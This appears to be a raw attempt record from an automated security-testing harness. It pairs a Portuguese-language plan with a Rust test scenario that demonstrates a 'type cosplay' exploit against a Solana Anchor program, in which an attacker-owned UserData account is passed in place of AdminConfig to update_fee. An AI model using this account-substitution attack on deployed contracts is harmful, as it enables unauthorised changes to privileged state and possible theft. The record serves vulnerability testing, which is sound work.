attempts.raw:
{
  "plan": "Preparamos uma conta AdminConfig legítima com admin = carteira legítima e fee_basis_points = 100, e uma conta UserData com authority = atacante e balance = 999. O baseline chama update_fee com a conta AdminConfig e a autoridade legítima, provando que o cenário está correto. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, com o atacante como signer. O efeito mede se os bytes 40..48 da conta UserData foram alterados para o novo fee, demonstrando que uma conta de outro tipo foi aceita (type cosplay).",
  "scenario": "let program_id = env.program_id;

// Chaves
let admin = Pubkey::new_unique();
let attacker = Pubkey::new_unique();
let config_key = Pubkey::new_unique();
let user_data_key = Pubkey::new_unique();

// Conta AdminConfig legítima: admin + fee_basis_points = 100
let mut config_data = anchor_account_data("AdminConfig", &[admin.to_bytes().to_vec(), 100u64.to_le_bytes().to_vec()]);
let config_account = account(&program_id, &config_data, None);

// Conta UserData maliciosa: authority = attacker, balance = 999
let mut user_data = anchor_account_data("UserData", &[attacker.to_bytes().to_vec(), 999u64.to_le_bytes().to_vec()]);
let user_data_account = account(&program_id, &user_data, None);

// Carteiras
let admin_wallet = wallet(1_000_000_000);
let attacker_wallet = wallet(1_000_000_000);

// Baseline: update_fee com AdminConfig e admin legítimo
let ix_baseline = env.anchor_ix(
    "update_fee",
    &[200u64],
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(admin, true),
    ],
);
let contas_baseline = vec![
    (config_key, config_account.clone()),
    (admin, admin_wallet.clone()),
];
let r_baseline = env.baseline("update_fee legítimo com AdminConfig", &ix_baseline, &contas_baseline);

// Ataque: update_fee passando UserData no lugar de AdminConfig, com attacker como signer
let ix_attack = env.anchor_ix(
    "update_fee",
    &[777u64],
    vec![
        AccountMeta::new(user_data_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let contas_attack = vec![
    (user_data_key, user_data_account.clone()),
    (attacker, attacker_wallet.clone()),
];
let r_attack = env.attack("update_fee com UserData no lugar de AdminConfig", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let user_data_after = after(&r_attack, &user_data_key);
    let fee_after = read_u64(user_data_after.data(), 40);
    env.effect(
        "UserData foi aceita como AdminConfig e seu campo balance (offset 40) foi alterado para 777",
        fee_after == 777u64,
    );
}"
}

